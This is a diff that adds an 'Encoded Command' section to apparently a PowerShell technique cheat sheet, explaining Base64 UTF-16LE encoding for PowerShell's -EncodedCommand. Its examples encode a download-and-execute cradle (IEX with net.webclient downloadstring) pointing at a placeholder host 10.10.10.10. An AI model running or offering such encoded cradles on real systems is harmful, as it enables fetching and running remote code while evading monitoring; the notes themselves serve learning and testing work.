@@ -101,3 +101,23 @@ Onced imported we can list all commands that we previously imported.
 ```powershell
 Get-Command -Module <modulename>
 ```
+
+# Encoded Command
+
+We can use a Base64 payload to avoid problems with of notation or quotes. We can use parameters `-EncodedCommand` or `-enc` to specify that the payload will be encoded.
+
+We need to use `Unicode` encoding instead of `UTF-8` or `ASCII` at base64 conversion.
+
+* PowerShell:
+
+```powershell
+$str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.10.10/a"))'
+[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
+```
+
+* Bash:
+
+```bash
+str='IEX ((new-object net.webclient).downloadstring("http://10.10.10.10/a"))'
+echo -en $str | iconv -t UTF-16LE | base64 -w 0
+```
